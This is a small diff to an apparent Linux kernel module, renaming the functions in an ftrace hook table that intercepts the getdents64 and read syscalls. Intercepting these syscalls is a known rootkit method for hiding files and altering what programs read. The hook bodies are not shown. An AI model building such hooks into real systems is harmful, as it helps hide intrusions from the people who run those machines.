@@ -9,7 +9,7 @@
 
 // define which functions to hook
 static struct ftrace_hook hooks[] = {
-        HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
+        HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
         HOOK("__x64_sys_read", hook_read, &orig_read),
 };
 
